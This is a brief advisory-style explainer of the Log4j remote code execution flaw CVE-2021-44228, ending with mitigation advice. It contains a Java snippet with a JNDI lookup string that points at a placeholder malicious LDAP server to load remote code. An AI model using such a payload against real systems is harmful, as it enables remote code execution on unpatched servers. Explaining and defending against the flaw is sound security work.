CVE-2021-44228 is a remote code execution vulnerability in the Log4j logging library. It is caused by the library's failure to properly sanitize user-input data, which can lead to the execution of arbitrary shell commands. An attacker can exploit this vulnerability by sending a specially crafted request to a web application that uses Log4j, which will contain a reference to a malicious Java class. This Java class will be executed on the server, allowing the attacker to achieve remote code execution. An example of how to exploit this vulnerability can be seen in the following Java code:

```java
String logMessage = "This is a log message: ${jndi:ldap://malicious_jndi_server_ip:1389/cn}";
Logger logger = LogManager.getLogger();
logger.error(logMessage);
```

Mitigation strategies include updating to the latest version of Log4j, disabling JNDI lookups, and using a Web Application Firewall (WAF) to block suspicious traffic.

